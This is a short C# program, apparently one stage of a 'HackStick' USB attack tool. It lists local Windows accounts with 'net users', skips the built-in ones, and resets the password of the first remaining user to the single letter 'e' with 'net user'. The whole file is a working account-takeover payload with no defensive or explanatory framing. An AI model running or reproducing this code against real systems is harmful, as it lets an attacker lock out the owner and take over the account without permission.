using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HackStick.Phase3
{
    public static class Program
    {
        public static void Main()
        {
            string netUsersOutput = Helper.RunCommand("C:\\Windows\\System32\\net.exe", "users");

            const string startMarker = "-------------------------------------------------------------------------------";
            const string endMarker = "The command completed successfully.";
            int start = netUsersOutput.IndexOf(startMarker) + startMarker.Length;
            int end = netUsersOutput.IndexOf(endMarker);
            string goodPart = netUsersOutput.Substring(start, end - start);
            goodPart = goodPart.Replace("\r", " ").Replace("\n", " ");
            string[] users = goodPart.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            string targetUser = "";
            foreach (string user in users)
            {
                if (user != "Administrator" && user != "DefaultAccount" && user != "Guest" && user != "WDAGUtilityAccount")
                {
                    targetUser = user;
                    break;
                }
            }

            Helper.RunCommand("C:\\Windows\\System32\\net.exe", $"user {targetUser} e");
        }
    }
}